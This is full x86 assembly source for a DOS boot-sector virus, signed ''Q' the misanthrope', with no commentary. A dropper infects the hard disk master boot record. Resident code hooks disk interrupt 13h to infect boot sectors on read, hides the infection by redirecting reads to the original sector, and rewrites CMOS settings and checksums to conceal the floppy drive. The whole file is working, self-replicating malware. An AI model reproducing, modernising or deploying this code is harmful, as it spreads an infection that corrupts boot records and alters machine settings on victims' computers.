

code_seg        segment byte public 'CODE'
		assume cs:code_seg
		

;designed by "Q" the misanthrope.
		
		
		org    100h


start:
		

dropper         proc    near
		push    cs
		pop     ds
		mov     ax,3513h
		int     21h
		mov     word ptr ds:[old_int_13],bx
		mov     word ptr ds:[old_int_13+02h],es
		mov     ax,2513h
		mov     dx,offset isr13
		int     21h
		mov     di,10
retry_floppy:   mov     ax,0201h
		mov     bx,offset buffer
		push    cs
		pop     es
		mov     cx,0001h
		mov     dx,0080h
		int     13h
		jnc     done_w_floppy
		xor     ax,ax
		int     13h
		dec     di
		jnz     retry_floppy
done_w_floppy:  lds     dx,dword ptr ds:[old_int_13]
		mov     ax,2513h
		int     21h
		mov     ax,4c00h
		int     21h
dropper         endp


buffer          db      512 dup (0)


		org     7c00h


top             label   byte
		jmp     short startup
cmos_was        dw      0h                


		org     7c3eh


middle          label   byte
	       

set_cx_dx_do_ax proc    near      
		push    cx
		push    dx
		push    bp
		test    dl,80h
		jz      floppy_cx_dx
		mov     cl,9
		add     cl,dh
		mov     dh,0
		jmp     short set_for_read
floppy_cx_dx:   mov     bp,word ptr ds:[bx+11h]
		mov     cl,4
		shr     bp,cl
		mov     cx,word ptr ds:[bx+16h]
		shl     cx,1
		add     cx,bp
		inc     cx
		sub     cx,word ptr ds:[bx+18h]
		mov     dh,1
set_for_read:   pushf
		push    cs
		call    jmp_old_int_13
		pop     bp
		pop     dx
		pop     cx
		retn
set_cx_dx_do_ax endp


startup         proc    near                
		mov     cl,06h
		push    cs
		mov     si,bx
		mov     di,si
		pop     ds
		int     12h
		sub     al,20h
		shl     ax,cl
		mov     cx,bottom-top
		cld     
		mov     es,ax
		rep     movsb
		mov     si,4ch
		movsw
		movsw
		mov     word ptr ds:[si-02h],ax
		mov     word ptr ds:[si-04h],offset floppy_isr13
		dec     word ptr ds:[0413h]
		sub     ax,ax
		cwd
		int     13h
		int     19h
startup         endp
		

before_floppy   proc    near
		pushf    
		push    bx
		push    ds
		sub     bx,bx
		mov     ds,bx
		cmp     ah,00h
		jne     get_the_cmos
		and     word ptr ds:[0490h],1110111111101111b
get_the_cmos:   mov     bx,word ptr cs:[cmos_was]
		test    bh,00010000b
		jnz     set_cmos
		or      byte ptr ds:[048fh],00000001b
		jmp     short set_cmos
before_floppy   endp


get_cmos_reg_al proc    near
		out     70h,al
		jmp     $+2
		in      al,71h
		retn
get_cmos_reg_al endp


signature       db      " PUR'CYST "

		
set_cmos_reg_ax proc    near
		out     70h,al
		jmp     $+2
		mov     al,ah
		out     71h,al
		retn
set_cmos_reg_ax endp
		

after_floppy    proc    near
		pushf    
		push    bx
		push    ds
		mov     bx,word ptr cs:[cmos_was]
		test    bh,00010000b
		jnz     set_cmos
		test    bh,11110000b
		jz      set_cmos
		sub     bh,00010000b
set_cmos:       push    ax
		push    dx
		call    cmos_checksum
		in      al,71h
		cmp     al,dh
		jne     return_back
		mov     al,2fh
		call    get_cmos_reg_al
		cmp     al,dl
		jne     return_back
		xchg    ax,bx
		mov     al,10h                          
		call    set_cmos_reg_ax
		call    cmos_checksum
		mov     al,dh
		out     71h,al
		mov     al,2fh
		mov     ah,dl
		call    set_cmos_reg_ax
return_back:    pop     dx
		pop     ax
not_from_mbr:   pop     ds
		pop     bx
		popf
return_near:    retn
after_floppy    endp


cmos_checksum   proc    near                            
		xor     ax,ax
		cwd
		mov     bl,10h
get_next_byte:  mov     al,bl
		out     70h,al
		cmp     bl,2eh
		je      return_near
		in      al,71h
		add     dx,ax
		inc     bx
		jmp     get_next_byte
cmos_checksum   endp


floppy_isr13    proc    near
		test    dl,80h
		jnz     isr13
		cmp     byte ptr cs:[cmos_was],'Q'
		jne     isr13
		call    before_floppy    
		pushf
		push    cs
		call    isr13
		call    after_floppy
		jmp     short go_back
floppy_isr13    endp

		
isr13           proc    near          
		cmp     ah,02h
		jne     jmp_old_int_13
		cmp     cx,0001h
		jne     jmp_old_int_13
		cmp     dh,cl
		ja      jmp_old_int_13     
		pushf
		push    cs
		call    jmp_old_int_13
		pushf
		push    ax
		push    ds
		push    es
		pop     ds
		jc      bad_read
		cmp     word ptr ds:[bx+01feh],0aa55h
		jne     bad_read
		cmp     word ptr ds:[bx+startup-top],0aa55h
		org     $-2
		mov     cl,06h
		je      re_direct
		mov     ax,0301h
		call    set_cx_dx_do_ax
		jc      bad_read
		push    si
		push    di
		mov     word ptr ds:[bx],0aa55h
		org     $-2
		jmp     $(startup-top)
		cmp     dx,0080h
		jne     non_mbr
		mov     ax,5110h
		call    get_cmos_reg_al
		xchg    ah,al
		mov     word ptr ds:[bx+cmos_was-top],ax
		mov     word ptr cs:[cmos_was],ax
non_mbr:        mov     si,offset middle
		lea     di,ds:[bx+(middle-top)]
		mov     cx,bottom-middle
		cld     
		repe    movs byte ptr es:[di],cs:[si]
		pop     di
		pop     si
		inc     cx
		mov     ax,0301h
		pushf
		push    cs
		call    jmp_old_int_13
re_direct:      mov     ax,0201h
		call    set_cx_dx_do_ax
bad_read:       pop     ds
		pop     ax
		popf
go_back:        retf    02h
isr13           endp
		
		
jmp_old_int_13  proc    near 
		db      0eah
bottom          label   byte
jmp_old_int_13  endp 


old_int_13      dd      00000000h


code_seg        ends
end             start



